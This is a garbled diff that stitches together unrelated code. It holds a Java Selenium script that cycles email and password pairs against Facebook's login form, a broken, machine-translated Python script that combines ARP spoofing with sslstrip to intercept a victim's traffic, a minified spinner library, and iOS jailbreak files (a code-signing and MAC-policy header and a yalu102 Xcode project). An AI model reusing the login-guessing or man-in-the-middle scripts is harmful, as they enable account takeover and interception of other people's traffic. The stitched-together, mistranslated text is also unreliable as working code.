@@ -1,0 +1,874 @@
+package com.test;
+FB.com/at%%%%; / Facebook.com / www.facebook.com
+
+NObd beta not. 
+
+//
+
+import org.openqa.selenium.By;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.firefox.FirefoxDriver;
+
+public class Automation {
+	public static void main(String[] args) throws InterruptedException {
+		System.setProperty("webdriver.gecko.driver","/home/nikesh/Downloads/geckodriver");
+        WebDriver driver = new FirefoxDriver();
+        String baseUrl = "https:facebook.com";
+        String expectedTitle = "";
+        String actualTitle = "";
+        driver.get(baseUrl);
+        System.out.println("Page title  : " + driver.getTitle());
+        actualTitle = driver.getTitle();
+        
+        //fill this array for all possible email and password
+        String emailPass[][]=new String[][]{{"Nikesh","Joshi"},{"Email","password"}};
+        for(int i = 0; i < emailPass.length ; i++ )
+        {
+        	WebElement email = driver.findElement(By.id("email"));
+            WebElement password = driver.findElement(By.id("pass"));
+            email.clear();
+            password.clear();
+        	email.sendKeys(emailPass[i][0]);
+            password.sendKeys(emailPass[i][1]);
+            email.submit();
+            Thread.sleep(3000);
+            if(driver.getTitle().toString().indexOf("Log")==-1)
+            {
+            	System.out.println("login SuccessFully.");
+            	break;
+            }
+            else
+            {
+            	System.out.println("Error in Login.");
+            }
+        }
+        
+        //System.out.println("Page title  : " + driver.getTitle());
+        driver.close();
+        System.exit(0);
+    }
+};
+
+
+! / Usr / bin / env python
+
+import os
+scapy.all de importación *
+enhebrado de importación
+
+víctima = raw_input ( "Introduzca la víctima:")
+GW = raw_input ( "Gateway?")
+file = raw_input ( "Log destino del archivo:")
+
+os.system ( "echo 1> / proc / sys / net / ipv4 / ip_forward")
+os.system ( "iptables -t nat -A PREROUTING -p tcp --destination-puerto 80 -j REDIRECT --to-puerto 8080")
+
+
+
+def attack_victim (víctima, GW):
+	pkt = éter (dst = "FF: FF: FF: FF: FF: FF") / ARP (PSRC = gw, PDST = víctima)
+	while True:
+		sendp (PKT)
+
+attack_gw def (víctima, GW):
+	pkt = éter (dst = "FF: FF: FF: FF: FF: FF") / ARP (PSRC = víctima, PDST = gw)
+	while True:
+		sendp (PKT)
+sslstrip def (archivo):
+	os.system ( "sslstrip -k -l 8080 w" + archivo)
+
+th_victim = threading.Thread (target = attack_victim, args = (víctima, gw))
+th_gw = threading.Thread (target = attack_gw, args = (víctima, gw))
+th_ssl = threading.Thread (target = sslstrip, args = (archivo,))
+
+th_ssl.start ()
+th_victim.start ()
+
+# Th_gw.start ()
+!function(a,b){"object"==typeof module&&module.exports?module.exports=b():"function"==typeof define&&define.amd?define(b):a.Spinner=b()}(this,function(){"use strict";function a(a,b){var c,d=document.createElement(a||"div");for(c in b)d[c]=b[c];return d}function b(a){for(var b=1,c=arguments.length;c>b;b++)a.appendChild(arguments[b]);return a}function c(a,b,c,d){var e=["opacity",b,~~(100*a),c,d].join("-"),f=.01+c/d*100,g=Math.max(1-(1-a)/b*(100-f),a),h=j.substring(0,j.indexOf("Animation")).toLowerCase(),i=h&&"-"+h+"-"||"";return m[e]||(k.insertRule("@"+i+"keyframes "+e+"{0%{opacity:"+g+"}"+f+"%{opacity:"+a+"}"+(f+.01)+"%{opacity:1}"+(f+b)%100+"%{opacity:"+a+"}100%{opacity:"+g+"}}",k.cssRules.length),m[e]=1),e}function d(a,b){var c,d,e=a.style;if(b=b.charAt(0).toUpperCase()+b.slice(1),void 0!==e[b])return b;for(d=0;d<l.length;d++)if(c=l[d]+b,void 0!==e[c])return c}function e(a,b){for(var c in b)a.style[d(a,c)||c]=b[c];return a}function f(a){for(var b=1;b<arguments.length;b++){var c=arguments[b];for(var d in c)void 0===a[d]&&(a[d]=c[d])}return a}function g(a,b){return"string"==typeof a?a:a[b%a.length]}function h(a){this.opts=f(a||{},h.defaults,n)}function i(){function c(b,c){return a("<"+b+' xmlns="urn:schemas-microsoft.com:vml" class="spin-vml">',c)}k.addRule(".spin-vml","behavior:url(#default#VML)"),h.prototype.lines=function(a,d){function f(){return e(c("group",{coordsize:k+" "+k,coordorigin:-j+" "+-j}),{width:k,height:k})}function h(a,h,i){b(m,b(e(f(),{rotation:360/d.lines*a+"deg",left:~~h}),b(e(c("roundrect",{arcsize:d.corners}),{width:j,height:d.scale*d.width,left:d.scale*d.radius,top:-d.scale*d.width>>1,filter:i}),c("fill",{color:g(d.color,a),opacity:d.opacity}),c("stroke",{opacity:0}))))}var i,j=d.scale*(d.length+d.width),k=2*d.scale*j,l=-(d.width+d.length)*d.scale*2+"px",m=e(f(),{position:"absolute",top:l,left:l});if(d.shadow)for(i=1;i<=d.lines;i++)h(i,-2,"progid:DXImageTransform.Microsoft.Blur(pixelradius=2,makeshadow=1,shadowopacity=.3)");for(i=1;i<=d.lines;i++)h(i);return b(a,m)},h.prototype.opacity=function(a,b,c,d){var e=a.firstChild;d=d.shadow&&d.lines||0,e&&b+d<e.childNodes.length&&(e=e.childNodes[b+d],e=e&&e.firstChild,e=e&&e.firstChild,e&&(e.opacity=c))}}var j,k,l=["webkit","Moz","ms","O"],m={},n={lines:12,length:7,width:5,radius:10,scale:1,corners:1,color:"#000",opacity:.25,rotate:0,direction:1,speed:1,trail:100,fps:20,zIndex:2e9,className:"spinner",top:"50%",left:"50%",shadow:!1,hwaccel:!1,position:"absolute"};if(h.defaults={},f(h.prototype,{spin:function(b){this.stop();var c=this,d=c.opts,f=c.el=a(null,{className:d.className});if(e(f,{position:d.position,width:0,zIndex:d.zIndex,left:d.left,top:d.top}),b&&b.insertBefore(f,b.firstChild||null),f.setAttribute("role","progressbar"),c.lines(f,c.opts),!j){var g,h=0,i=(d.lines-1)*(1-d.direction)/2,k=d.fps,l=k/d.speed,m=(1-d.opacity)/(l*d.trail/100),n=l/d.lines;!function o(){h++;for(var a=0;a<d.lines;a++)g=Math.max(1-(h+(d.lines-a)*n)%l*m,d.opacity),c.opacity(f,a*d.direction+i,g,d);c.timeout=c.el&&setTimeout(o,~~(1e3/k))}()}return c},stop:function(){var a=this.el;return a&&(clearTimeout(this.timeout),a.parentNode&&a.parentNode.removeChild(a),this.el=void 0),this},lines:function(d,f){function h(b,c){return e(a(),{position:"absolute",width:f.scale*(f.length+f.width)+"px",height:f.scale*f.width+"px",background:b,boxShadow:c,transformOrigin:"left",transform:"rotate("+~~(360/f.lines*k+f.rotate)+"deg) translate("+f.scale*f.radius+"px,0)",borderRadius:(f.corners*f.scale*f.width>>1)+"px"})}for(var i,k=0,l=(f.lines-1)*(1-f.direction)/2;k<f.lines;k++)i=e(a(),{position:"absolute",top:1+~(f.scale*f.width/2)+"px",transform:f.hwaccel?"translate3d(0,0,0)":"",opacity:f.opacity,animation:j&&c(f.opacity,f.trail,l+k*f.direction,f.lines)+" "+1/f.speed+"s linear infinite"}),f.shadow&&b(i,e(h("#000","0 0 4px #000"),{top:"2px"})),b(d,b(i,h(g(f.color,k),"0 0 1px rgba(0,0,0,.1)")));return d},opacity:function(a,b,c){b<a.childNodes.length&&(a.childNodes[b].style.opacity=c)}}),"undefined"!=typeof document){k=function(){var c=a("style",{type:"text/css"});return b(document.getElementsByTagName("head")[0],c),c.sheet||c.styleSheet}();var o=e(a("group"),{behavior:"url(#default#VML)"});!d(o,"transform")&&o.adj?i():j=d(o,"animation")}return h});
+
+
+
+
+
+op;
+
+
+#ifndef devicesupport_h
+#define devicesupport_h
+
+
+
+//0xFFFFFFF0075F6000+0x50 (0xfffffff006e4d620+0x4bc0)
+
+#define G(type) constget(type)
+#define S(type, val) constset(type,val)
+
+#define	CS_VALID		0x0000001	/* dynamically valid */
+#define CS_ADHOC		0x0000002	/* ad hoc signed */
+#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
+#define CS_INSTALLER		0x0000008	/* has installer entitlement */
+
+#define	CS_HARD			0x0000100	/* don't load invalid pages */
+#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
+#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
+#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
+#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
+#define CS_REQUIRE_LV		0x0002000	/* require library validation */
+#define CS_ENTITLEMENTS_VALIDATED	0x0004000
+
+#define	CS_ALLOWED_MACHO	0x00ffffe
+
+#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
+#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
+#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
+#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */
+
+#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
+#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
+#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
+#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */
+
+uint64_t constget(int idx);
+#import <stdint.h>
+struct mac_policy_ops{
+    uint64_t mpo_audit_check_postselect;
+    uint64_t mpo_audit_check_preselect;
+    uint64_t mpo_bpfdesc_label_associate;
+    uint64_t mpo_bpfdesc_label_destroy;
+    uint64_t mpo_bpfdesc_label_init;
+    uint64_t mpo_bpfdesc_check_receive;
+    uint64_t mpo_cred_check_label_update_execve;
+    uint64_t mpo_cred_check_label_update;
+    uint64_t mpo_cred_check_visible;
+    uint64_t mpo_cred_label_associate_fork;
+    uint64_t mpo_cred_label_associate_kernel;
+    uint64_t mpo_cred_label_associate;
+    uint64_t mpo_cred_label_associate_user;
+    uint64_t mpo_cred_label_destroy;
+    uint64_t mpo_cred_label_externalize_audit;
+    uint64_t mpo_cred_label_externalize;
+    uint64_t mpo_cred_label_init;
+    uint64_t mpo_cred_label_internalize;
+    uint64_t mpo_cred_label_update_execve;
+    uint64_t mpo_cred_label_update;
+    uint64_t mpo_devfs_label_associate_device;
+    uint64_t mpo_devfs_label_associate_directory;
+    uint64_t mpo_devfs_label_copy;
+    uint64_t mpo_devfs_label_destroy;
+    uint64_t mpo_devfs_label_init;
+    uint64_t mpo_devfs_label_update;
+    uint64_t mpo_file_check_change_offset;
+    uint64_t mpo_file_check_create;
+    uint64_t mpo_file_check_dup;
+    uint64_t mpo_file_check_fcntl;
+    uint64_t mpo_file_check_get_offset;
+    uint64_t mpo_file_check_get;
+    uint64_t mpo_file_check_inherit;
+    uint64_t mpo_file_check_ioctl;
+    uint64_t mpo_file_check_lock;
+    uint64_t mpo_file_check_mmap_downgrade;
+    uint64_t mpo_file_check_mmap;
+    uint64_t mpo_file_check_receive;
+    uint64_t mpo_file_check_set;
+    uint64_t mpo_file_label_init;
+    uint64_t mpo_file_label_destroy;
+    uint64_t mpo_file_label_associate;
+    uint64_t mpo_ifnet_check_label_update;
+    uint64_t mpo_ifnet_check_transmit;
+    uint64_t mpo_ifnet_label_associate;
+    uint64_t mpo_ifnet_label_copy;
+    uint64_t mpo_ifnet_label_destroy;
+    uint64_t mpo_ifnet_label_externalize;
+    uint64_t mpo_ifnet_label_init;
+    uint64_t mpo_ifnet_label_internalize;
+    uint64_t mpo_ifnet_label_update;
+    uint64_t mpo_ifnet_label_recycle;
+    uint64_t mpo_inpcb_check_deliver;
+    uint64_t mpo_inpcb_label_associate;
+    uint64_t mpo_inpcb_label_destroy;
+    uint64_t mpo_inpcb_label_init;
+    uint64_t mpo_inpcb_label_recycle;
+    uint64_t mpo_inpcb_label_update;
+    uint64_t mpo_iokit_check_device;
+    uint64_t mpo_ipq_label_associate;
+    uint64_t mpo_ipq_label_compare;
+    uint64_t mpo_ipq_label_destroy;
+    uint64_t mpo_ipq_label_init;
+    uint64_t mpo_ipq_label_update;
+    uint64_t mpo_file_check_library_validation;
+    uint64_t mpo_vnode_notify_setacl;
+    uint64_t mpo_vnode_notify_setattrlist;
+    uint64_t mpo_vnode_notify_setextattr;
+    uint64_t mpo_vnode_notify_setflags;
+    uint64_t mpo_vnode_notify_setmode;
+    uint64_t mpo_vnode_notify_setowner;
+    uint64_t mpo_vnode_notify_setutimes;
+    uint64_t mpo_vnode_notify_truncate;
+    uint64_t mpo_mbuf_label_associate_bpfdesc;
+    uint64_t mpo_mbuf_label_associate_ifnet;
+    uint64_t mpo_mbuf_label_associate_inpcb;
+    uint64_t mpo_mbuf_label_associate_ipq;
+    uint64_t mpo_mbuf_label_associate_linklayer;
+    uint64_t mpo_mbuf_label_associate_multicast_encap;
+    uint64_t mpo_mbuf_label_associate_netlayer;
+    uint64_t mpo_mbuf_label_associate_socket;
+    uint64_t mpo_mbuf_label_copy;
+    uint64_t mpo_mbuf_label_destroy;
+    uint64_t mpo_mbuf_label_init;
+    uint64_t mpo_mount_check_fsctl;
+    uint64_t mpo_mount_check_getattr;
+    uint64_t mpo_mount_check_label_update;
+    uint64_t mpo_mount_check_mount;
+    uint64_t mpo_mount_check_remount;
+    uint64_t mpo_mount_check_setattr;
+    uint64_t mpo_mount_check_stat;
+    uint64_t mpo_mount_check_umount;
+    uint64_t mpo_mount_label_associate;
+    uint64_t mpo_mount_label_destroy;
+    uint64_t mpo_mount_label_externalize;
+    uint64_t mpo_mount_label_init;
+    uint64_t mpo_mount_label_internalize;
+    uint64_t mpo_netinet_fragment;
+    uint64_t mpo_netinet_icmp_reply;
+    uint64_t mpo_netinet_tcp_reply;
+    uint64_t mpo_pipe_check_ioctl;
+    uint64_t mpo_pipe_check_kqfilter;
+    uint64_t mpo_pipe_check_label_update;
+    uint64_t mpo_pipe_check_read;
+    uint64_t mpo_pipe_check_select;
+    uint64_t mpo_pipe_check_stat;
+    uint64_t mpo_pipe_check_write;
+    uint64_t mpo_pipe_label_associate;
+    uint64_t mpo_pipe_label_copy;
+    uint64_t mpo_pipe_label_destroy;
+    uint64_t mpo_pipe_label_externalize;
+    uint64_t mpo_pipe_label_init;
+    uint64_t mpo_pipe_label_internalize;
+    uint64_t mpo_pipe_label_update;
+    uint64_t mpo_policy_destroy;
+    uint64_t mpo_policy_init;
+    uint64_t mpo_policy_initbsd;
+    uint64_t mpo_policy_syscall;
+    uint64_t mpo_system_check_sysctlbyname;
+    uint64_t mpo_proc_check_inherit_ipc_ports;
+    uint64_t mpo_vnode_check_rename;
+    uint64_t mpo_kext_check_query;
+    uint64_t mpo_iokit_check_nvram_get;
+    uint64_t mpo_iokit_check_nvram_set;
+    uint64_t mpo_iokit_check_nvram_delete;
+    uint64_t mpo_proc_check_expose_task;
+    uint64_t mpo_proc_check_set_host_special_port;
+    uint64_t mpo_proc_check_set_host_exception_port;
+    uint64_t mpo_exc_action_check_exception_send;
+    uint64_t mpo_exc_action_label_associate;
+    uint64_t mpo_exc_action_label_copy;
+    uint64_t mpo_exc_action_label_destroy;
+    uint64_t mpo_exc_action_label_init;
+    uint64_t mpo_exc_action_label_update;
+    uint64_t mpo_reserved1;
+    uint64_t mpo_reserved2;
+    uint64_t mpo_reserved3;
+    uint64_t mpo_reserved4;
+    uint64_t mpo_reserved5;
+    uint64_t mpo_reserved6;
+    uint64_t mpo_posixsem_check_create;
+    uint64_t mpo_posixsem_check_open;
+    uint64_t mpo_posixsem_check_post;
+    uint64_t mpo_posixsem_check_unlink;
+    uint64_t mpo_posixsem_check_wait;
+    uint64_t mpo_posixsem_label_associate;
+    uint64_t mpo_posixsem_label_destroy;
+    uint64_t mpo_posixsem_label_init;
+    uint64_t mpo_posixshm_check_create;
+    uint64_t mpo_posixshm_check_mmap;
+    uint64_t mpo_posixshm_check_open;
+    uint64_t mpo_posixshm_check_stat;
+    uint64_t mpo_posixshm_check_truncate;
+    uint64_t mpo_posixshm_check_unlink;
+    uint64_t mpo_posixshm_label_associate;
+    uint64_t mpo_posixshm_label_destroy;
+    uint64_t mpo_posixshm_label_init;
+    uint64_t mpo_proc_check_debug;
+    uint64_t mpo_proc_check_fork;
+    uint64_t mpo_proc_check_get_task_name;
+    uint64_t mpo_proc_check_get_task;
+    uint64_t mpo_proc_check_getaudit;
+    uint64_t mpo_proc_check_getauid;
+    uint64_t mpo_proc_check_getlcid;
+    uint64_t mpo_proc_check_mprotect;
+    uint64_t mpo_proc_check_sched;
+    uint64_t mpo_proc_check_setaudit;
+    uint64_t mpo_proc_check_setauid;
+    uint64_t mpo_proc_check_setlcid;
+    uint64_t mpo_proc_check_signal;
+    uint64_t mpo_proc_check_wait;
+    uint64_t mpo_proc_label_destroy;
+    uint64_t mpo_proc_label_init;
+    uint64_t mpo_socket_check_accept;
+    uint64_t mpo_socket_check_accepted;
+    uint64_t mpo_socket_check_bind;
+    uint64_t mpo_socket_check_connect;
+    uint64_t mpo_socket_check_create;
+    uint64_t mpo_socket_check_deliver;
+    uint64_t mpo_socket_check_kqfilter;
+    uint64_t mpo_socket_check_label_update;
+    uint64_t mpo_socket_check_listen;
+    uint64_t mpo_socket_check_receive;
+    uint64_t mpo_socket_check_received;
+    uint64_t mpo_socket_check_select;
+    uint64_t mpo_socket_check_send;
+    uint64_t mpo_socket_check_stat;
+    uint64_t mpo_socket_check_setsockopt;
+    uint64_t mpo_socket_check_getsockopt;
+    uint64_t mpo_socket_label_associate_accept;
+    uint64_t mpo_socket_label_associate;
+    uint64_t mpo_socket_label_copy;
+    uint64_t mpo_socket_label_destroy;
+    uint64_t mpo_socket_label_externalize;
+    uint64_t mpo_socket_label_init;
+    uint64_t mpo_socket_label_internalize;
+    uint64_t mpo_socket_label_update;
+    uint64_t mpo_socketpeer_label_associate_mbuf;
+    uint64_t mpo_socketpeer_label_associate_socket;
+    uint64_t mpo_socketpeer_label_destroy;
+    uint64_t mpo_socketpeer_label_externalize;
+    uint64_t mpo_socketpeer_label_init;
+    uint64_t mpo_system_check_acct;
+    uint64_t mpo_system_check_audit;
+    uint64_t mpo_system_check_auditctl;
+    uint64_t mpo_system_check_auditon;
+    uint64_t mpo_system_check_host_priv;
+    uint64_t mpo_system_check_nfsd;
+    uint64_t mpo_system_check_reboot;
+    uint64_t mpo_system_check_settime;
+    uint64_t mpo_system_check_swapoff;
+    uint64_t mpo_system_check_swapon;
+    uint64_t mpo_reserved7;
+    uint64_t mpo_sysvmsg_label_associate;
+    uint64_t mpo_sysvmsg_label_destroy;
+    uint64_t mpo_sysvmsg_label_init;
+    uint64_t mpo_sysvmsg_label_recycle;
+    uint64_t mpo_sysvmsq_check_enqueue;
+    uint64_t mpo_sysvmsq_check_msgrcv;
+    uint64_t mpo_sysvmsq_check_msgrmid;
+    uint64_t mpo_sysvmsq_check_msqctl;
+    uint64_t mpo_sysvmsq_check_msqget;
+    uint64_t mpo_sysvmsq_check_msqrcv;
+    uint64_t mpo_sysvmsq_check_msqsnd;
+    uint64_t mpo_sysvmsq_label_associate;
+    uint64_t mpo_sysvmsq_label_destroy;
+    uint64_t mpo_sysvmsq_label_init;
+    uint64_t mpo_sysvmsq_label_recycle;
+    uint64_t mpo_sysvsem_check_semctl;
+    uint64_t mpo_sysvsem_check_semget;
+    uint64_t mpo_sysvsem_check_semop;
+    uint64_t mpo_sysvsem_label_associate;
+    uint64_t mpo_sysvsem_label_destroy;
+    uint64_t mpo_sysvsem_label_init;
+    uint64_t mpo_sysvsem_label_recycle;
+    uint64_t mpo_sysvshm_check_shmat;
+    uint64_t mpo_sysvshm_check_shmctl;
+    uint64_t mpo_sysvshm_check_shmdt;
+    uint64_t mpo_sysvshm_check_shmget;
+    uint64_t mpo_sysvshm_label_associate;
+    uint64_t mpo_sysvshm_label_destroy;
+    uint64_t mpo_sysvshm_label_init;
+    uint64_t mpo_sysvshm_label_recycle;
+    uint64_t mpo_reserved8;
+    uint64_t mpo_reserved9;
+    uint64_t mpo_vnode_check_getattr;
+    uint64_t mpo_mount_check_snapshot_create;
+    uint64_t mpo_mount_check_snapshot_delete;
+    uint64_t mpo_vnode_check_clone;
+    uint64_t mpo_proc_check_get_cs_info;
+    uint64_t mpo_proc_check_set_cs_info;
+    uint64_t mpo_iokit_check_hid_control;
+    uint64_t mpo_vnode_check_access;
+    uint64_t mpo_vnode_check_chdir;
+    uint64_t mpo_vnode_check_chroot;
+    uint64_t mpo_vnode_check_create;
+    uint64_t mpo_vnode_check_deleteextattr;
+    uint64_t mpo_vnode_check_exchangedata;
+    uint64_t mpo_vnode_check_exec;
+    uint64_t mpo_vnode_check_getattrlist;
+    uint64_t mpo_vnode_check_getextattr;
+    uint64_t mpo_vnode_check_ioctl;
+    uint64_t mpo_vnode_check_kqfilter;
+    uint64_t mpo_vnode_check_label_update;
+    uint64_t mpo_vnode_check_link;
+    uint64_t mpo_vnode_check_listextattr;
+    uint64_t mpo_vnode_check_lookup;
+    uint64_t mpo_vnode_check_open;
+    uint64_t mpo_vnode_check_read;
+    uint64_t mpo_vnode_check_readdir;
+    uint64_t mpo_vnode_check_readlink;
+    uint64_t mpo_vnode_check_rename_from;
+    uint64_t mpo_vnode_check_rename_to;
+    uint64_t mpo_vnode_check_revoke;
+    uint64_t mpo_vnode_check_select;
+    uint64_t mpo_vnode_check_setattrlist;
+    uint64_t mpo_vnode_check_setextattr;
+    uint64_t mpo_vnode_check_setflags;
+    uint64_t mpo_vnode_check_setmode;
+    uint64_t mpo_vnode_check_setowner;
+    uint64_t mpo_vnode_check_setutimes;
+    uint64_t mpo_vnode_check_stat;
+    uint64_t mpo_vnode_check_truncate;
+    uint64_t mpo_vnode_check_unlink;
+    uint64_t mpo_vnode_check_write;
+    uint64_t mpo_vnode_label_associate_devfs;
+    uint64_t mpo_vnode_label_associate_extattr;
+    uint64_t mpo_vnode_label_associate_file;
+    uint64_t mpo_vnode_label_associate_pipe;
+    uint64_t mpo_vnode_label_associate_posixsem;
+    uint64_t mpo_vnode_label_associate_posixshm;
+    uint64_t mpo_vnode_label_associate_singlelabel;
+    uint64_t mpo_vnode_label_associate_socket;
+    uint64_t mpo_vnode_label_copy;
+    uint64_t mpo_vnode_label_destroy;
+    uint64_t mpo_vnode_label_externalize_audit;
+    uint64_t mpo_vnode_label_externalize;
+    uint64_t mpo_vnode_label_init;
+    uint64_t mpo_vnode_label_internalize;
+    uint64_t mpo_vnode_label_recycle;
+    uint64_t mpo_vnode_label_store;
+    uint64_t mpo_vnode_label_update_extattr;
+    uint64_t mpo_vnode_label_update;
+    uint64_t mpo_vnode_notify_create;
+    uint64_t mpo_vnode_check_signature;
+    uint64_t mpo_vnode_check_uipc_bind;
+    uint64_t mpo_vnode_check_uipc_connect;
+    uint64_t mpo_proc_check_run_cs_invalid;
+    uint64_t mpo_proc_check_suspend_resume;
+    uint64_t mpo_thread_userret;
+    uint64_t mpo_iokit_check_set_properties;
+    uint64_t mpo_system_check_chud;
+    uint64_t mpo_vnode_check_searchfs;
+    uint64_t mpo_priv_check;
+    uint64_t mpo_priv_grant;
+    uint64_t mpo_proc_check_map_anon;
+    uint64_t mpo_vnode_check_fsgetpath;
+    uint64_t mpo_iokit_check_open;
+    uint64_t mpo_proc_check_ledger;
+    uint64_t mpo_vnode_notify_rename;
+    uint64_t mpo_vnode_check_setacl;
+    uint64_t mpo_vnode_notify_deleteextattr;
+    uint64_t mpo_system_check_kas_info;
+    uint64_t mpo_proc_check_cpumon;
+    uint64_t mpo_vnode_notify_open;
+    uint64_t mpo_system_check_info;
+    uint64_t mpo_pty_notify_grant;
+    uint64_t mpo_pty_notify_close;
+    uint64_t mpo_vnode_find_sigs;
+    uint64_t mpo_kext_check_load;
+    uint64_t mpo_kext_check_unload;
+    uint64_t mpo_proc_check_proc_info;
+    uint64_t mpo_vnode_notify_link;
+    uint64_t mpo_iokit_check_filter_properties;
+    uint64_t mpo_iokit_check_get_property;
+};
+
+
+
+#endif /* devicesupport_h */
+
+
+
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		EA1A3B9D1E391C4F009CA025 /* patchfinder64.o in Frameworks */ = {isa = PBXBuildFile; fileRef = EA1A3B9C1E391C4F009CA025 /* patchfinder64.o */; };
+		EA1A3BA81E398E33009CA025 /* 0.reload.plist in Resources */ = {isa = PBXBuildFile; fileRef = EA1A3BA61E398E33009CA025 /* 0.reload.plist */; };
+		EA1A3BAD1E399006009CA025 /* reload in Resources */ = {isa = PBXBuildFile; fileRef = EA1A3BAC1E399006009CA025 /* reload */; };
+		EA1A3BC51E39D1FF009CA025 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA1A3BC41E39D1FF009CA025 /* Assets.xcassets */; };
+		EA9900E81E1E9F060056FEBD /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = EA9900E71E1E9F060056FEBD /* main.m */; };
+		EA9900EB1E1E9F060056FEBD /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = EA9900EA1E1E9F060056FEBD /* AppDelegate.m */; };
+		EA9900EE1E1E9F060056FEBD /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = EA9900ED1E1E9F060056FEBD /* ViewController.m */; };
+		EA9900F11E1E9F060056FEBD /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = EA9900EF1E1E9F060056FEBD /* Main.storyboard */; };
+		EA9900F61E1E9F060056FEBD /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = EA9900F41E1E9F060056FEBD /* LaunchScreen.storyboard */; };
+		EA9901041E219C210056FEBD /* offsets.c in Sources */ = {isa = PBXBuildFile; fileRef = EA9901021E219C210056FEBD /* offsets.c */; };
+		EA9901061E219FF10056FEBD /* bootstrap.tar in Resources */ = {isa = PBXBuildFile; fileRef = EA9901051E219FF10056FEBD /* bootstrap.tar */; };
+		EA99010A1E21A04C0056FEBD /* tar in Resources */ = {isa = PBXBuildFile; fileRef = EA9901091E21A04C0056FEBD /* tar */; };
+		EA99010C1E21A0520056FEBD /* launchctl in Resources */ = {isa = PBXBuildFile; fileRef = EA99010B1E21A0520056FEBD /* launchctl */; };
+		EA99010E1E21A1560056FEBD /* jailbreak.m in Sources */ = {isa = PBXBuildFile; fileRef = EA99010D1E21A1560056FEBD /* jailbreak.m */; };
+		EA9901141E21A1B00056FEBD /* iokitmig64.o in Frameworks */ = {isa = PBXBuildFile; fileRef = EA9901131E21A1B00056FEBD /* iokitmig64.o */; };
+		EA9901171E21A1D90056FEBD /* devicesupport.m in Sources */ = {isa = PBXBuildFile; fileRef = EA9901161E21A1D90056FEBD /* devicesupport.m */; };
+		EA9901191E21A2180056FEBD /* IOKit.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = EA9901181E21A2180056FEBD /* IOKit.tbd */; };
+		EAA7F7C71E3EE4AF00BE3C64 /* dropbear.plist in Resources */ = {isa = PBXBuildFile; fileRef = EAA7F7C61E3EE4AF00BE3C64 /* dropbear.plist */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		EA1A3B9B1E38BBDB009CA025 /* patchfinder64.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = patchfinder64.h; sourceTree = "<group>"; };
+		EA1A3B9C1E391C4F009CA025 /* patchfinder64.o */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.objfile"; path = patchfinder64.o; sourceTree = "<group>"; };
+		EA1A3BA61E398E33009CA025 /* 0.reload.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = 0.reload.plist; sourceTree = "<group>"; };
+		EA1A3BAC1E399006009CA025 /* reload */ = {isa = PBXFileReference; lastKnownFileType = text.script.sh; path = reload; sourceTree = "<group>"; };
+		EA1A3BC41E39D1FF009CA025 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		EA9900E31E1E9F060056FEBD /* yalu102.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = yalu102.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA9900E71E1E9F060056FEBD /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		EA9900E91E1E9F060056FEBD /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		EA9900EA1E1E9F060056FEBD /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		EA9900EC1E1E9F060056FEBD /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
+		EA9900ED1E1E9F060056FEBD /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
+		EA9900F01E1E9F060056FEBD /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		EA9900F51E1E9F060056FEBD /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		EA9900F71E1E9F060056FEBD /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		EA9901021E219C210056FEBD /* offsets.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = offsets.c; sourceTree = "<group>"; };
+		EA9901031E219C210056FEBD /* offsets.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = offsets.h; sourceTree = "<group>"; };
